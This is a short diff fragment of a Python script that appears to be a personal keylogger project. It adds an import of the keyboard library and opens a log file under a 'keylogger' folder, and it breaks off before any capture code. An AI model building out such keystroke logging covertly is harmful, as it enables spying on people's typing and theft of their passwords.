@@ -5,14 +5,9 @@
 
 """
 
-
+import keyboard as key
 import numpy as np
 from datetime import datetime as t
-
-
-
-
-
 
 with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging:
     # This gets the date and time in 
